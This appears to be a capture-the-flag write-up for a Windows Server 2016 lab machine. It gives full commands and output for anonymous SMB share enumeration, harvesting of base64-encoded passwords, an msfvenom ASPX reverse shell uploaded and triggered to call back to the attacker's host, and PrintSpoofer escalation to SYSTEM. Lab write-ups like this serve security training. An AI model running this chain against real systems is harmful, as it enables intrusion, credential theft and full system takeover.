## INFORMATION GATHERING
```bash
# IP ADDRESS
10.10.174.78
# HOSTNAME //Found Post Initial Enumeration
Relevant
# OPERATING SYSTEM //Found Post Initial Enumeration
OS Name:                   Microsoft Windows Server 2016 Standard Evaluation
OS Version:                10.0.14393 N/A Build 14393

# CREDENTIALS  //Found Post Initial Enumeration
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```
## OPEN PORTS DETAILS
```bash
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
49663/tcp open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0

135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC

139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack ttl 125 Windows Server 2016 Standard Evaluation 14393 microsoft-ds

3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services

49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
```
# ENUMERATION
## PORT 139 445 SMB
```bash
sudo crackmapexec smb $ip
SMB         10.10.174.78    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)

sudo crackmapexec smb $ip --shares
SMB         10.10.174.78    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.174.78    445    RELEVANT         [-] Error enumerating shares: [Errno 32] Broken pipe

sudo crackmapexec smb $ip --shares -u 'anonymous' -p ''
SMB         10.10.174.78    445    RELEVANT         [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:RELEVANT) (domain:Relevant) (signing:False) (SMBv1:True)
SMB         10.10.174.78    445    RELEVANT         [+] Relevant\anonymous: 
SMB         10.10.174.78    445    RELEVANT         [+] Enumerated shares
SMB         10.10.174.78    445    RELEVANT         Share           Permissions     Remark
SMB         10.10.174.78    445    RELEVANT         -----           -----------     ------
SMB         10.10.174.78    445    RELEVANT         ADMIN$                          Remote Admin
SMB         10.10.174.78    445    RELEVANT         C$                              Default share
SMB         10.10.174.78    445    RELEVANT         IPC$                            Remote IPC
SMB         10.10.174.78    445    RELEVANT         nt4wrksv        READ,WRITE      

# Note
- Found share nt4wrksv with READ,WRITE permissions

sudo smbclient //$ip/nt4wrksv                  
Password for [WORKGROUP\root]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Feb 25 11:04:43 2025
  ..                                  D        0  Tue Feb 25 11:04:43 2025
  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020

                7735807 blocks of size 4096. 4937216 blocks available
smb: \> get passwords.txt 
getting file \passwords.txt of size 98 as passwords.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> put test.txt 
putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \> dir
  .                                   D        0  Tue Feb 25 11:06:33 2025
  ..                                  D        0  Tue Feb 25 11:06:33 2025
  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020
  test.txt                            A        5  Tue Feb 25 11:06:34 2025

                7735807 blocks of size 4096. 4936230 blocks available

cat passwords.txt 
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk    

- Decoded the base64 strings
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$

# Note
- Found passwords.txt file
- Able to upload/write files to the share
- Found possible credentials 
	- Bob:!P@$$W0rD!123 
	- Bill:Juw4nnaM4n420696969!$$$
```
## PORT 80
```bash
sudo whatweb -v $url
HTTPServer[Microsoft-IIS/10.0], 
X-Powered-By[ASP.NET]

- Checking for the share directory on the webserver
sudo curl http://10.10.174.78/nt4wrksv/passwords.txt

- No Response
```
## PORT 49663
```bash
sudo whatweb -v $url:49663
HTTPServer[Microsoft-IIS/10.0], 
X-Powered-By[ASP.NET]

- Checking for the share directory on the webserver
sudo curl http://10.10.174.78:49663/nt4wrksv/passwords.txt

- Found !! Able to view the contents of the file passwords.txt
```
## INITIAL FOOTHOLD
```bash
# Revese shell
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.80.25 LPORT=8080 -f aspx -o reverse.aspx
sudo smbclient //$ip/nt4wrksv
smb: \> put reverse.aspx 
putting file reverse.aspx as \reverse.aspx (2.7 kb/s) (average 2.7 kb/s)

sudo rlwrap nc -nvlp 8080
sudo curl http://10.10.174.78:49663/nt4wrksv/reverse.aspx

sudo rlwrap nc -nvlp 8080
listening on [any] 8080 ...
connect to [10.13.80.25] from (UNKNOWN) [10.10.174.78] 49887
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\defaultapppool
```
## PRIVILEGE ESCALATION
```bash
whoami /priv

SeImpersonatePrivilege        Impersonate a client after authentication Enabled

# Exploit source https://github.com/itm4n/PrintSpoofer

C:\Windows\Tasks>PrintSpoofer64.exe -i -c cmd                                                                                                                                                
PrintSpoofer64.exe -i -c cmd                                                                                                                                                                 
[+] Found privilege: SeImpersonatePrivilege                                                                                                                                                  
[+] Named pipe listening...                                                                                                                                                                  
[+] CreateProcessAsUser() OK                                                                                                                                                                 
Microsoft Windows [Version 10.0.14393]                                                        
(c) 2016 Microsoft Corporation. All rights reserved.                    

C:\Windows\system32>whoami                                                                                                                                                  
whoami                                                                                                                                                                      
nt authority\system                                 
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.95 scan initiated Tue Feb 25 11:02:19 2025 as: /usr/lib/nmap/nmap -Pn -p- -sC -sV -vv -oN nmap/scan-script-version 10.10.174.78
adjust_timeouts2: packet supposedly had rtt of -685337 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -685337 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -677501 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -677501 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -678552 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -678552 microseconds.  Ignoring time.
Nmap scan report for 10.10.174.78
Host is up, received user-set (0.35s latency).
Scanned at 2025-02-25 11:02:21 IST for 490s
Not shown: 65527 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
80/tcp    open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack ttl 125 Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
|_ssl-date: 2025-02-25T05:40:30+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2025-02-25T05:39:50+00:00
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-02-24T05:32:00
| Not valid after:  2025-08-26T05:32:00
| MD5:   bc39:4dc7:30c8:306c:5d5c:61dc:0b50:3a73
| SHA-1: 3186:3024:c5d1:b992:2862:a7ee:2c63:0099:d293:3ad5
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQHCcxT9qXj6hGlM/8MySmjzANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yNTAyMjQwNTMyMDBaFw0yNTA4MjYwNTMy
| MDBaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAtLIMgjLlswZORaQ7c4E3z/TWT9eN24Kh04+QDpa/QRJd2zYrW+48
| 0zxBdCRYNq1vwGuTsaSh7EoZcZhVkLm8OJs4S5A24bbOSSl5rR7L8GnTfhER3u/J
| XFJUxKplHsxc2GLmW5pMc0h+Xv9FsKJSi4zzjth9AhuwX3SyaQBAcBZnIcJlZ/Yu
| zTkuSGsbzAzsH0xnsUcsc5903IQuVFM8z7TMESXKdG33vNjlTTqd9KklOkVP/fXc
| 0bIIFuoWCG9IlR0+CZPlo0DUa/zTNpctIu22iIc9CQU4BARD0AGl3xHFq1KgLjkn
| GDDAwK0wfqoC42jVSjm2GiMFJtL1S+IBawIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBACB3zniWCDpY
| fG31bE7dfBfdTRwPH3SJFEA0h6Nn9YGDjZGYupDiKx7rIXcY2ODg6eiQ8PbtJ2jF
| Zpm8pd8lUtIGPLY99oD5Yh/wKvmCqd0mmg/0It+ituKZEdiLUQJkqcsRc/vfBCer
| p5vC7yOvP5zSgCHHrFTYTYrcbms4ihSeypiaCJUJiyBPKfej/MzIaG7Dme9H3Cd7
| lc5ZVqVi4vJDgytq+PUe31xKMCfWWpQp9DMHZaZzBre7cncT86RkCUJU8MRJH46u
| H0fx6VTRB3YruF8TYupIBTvcXFkRGQUZl365Y2WrJXbcLfohQD9kkpGUBUk4lfMq
| 3pSDVWiUT7o=
|_-----END CERTIFICATE-----
49663/tcp open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-02-25T05:39:54
|_  start_date: 2025-02-25T05:32:16
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-02-24T21:39:51-08:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 42929/tcp): CLEAN (Timeout)
|   Check 2 (port 39684/tcp): CLEAN (Timeout)
|   Check 3 (port 11914/udp): CLEAN (Timeout)
|   Check 4 (port 28454/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 1h36m00s, deviation: 3h34m40s, median: 0s

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 25 11:10:31 2025 -- 1 IP address (1 host up) scanned in 492.11 seconds
```

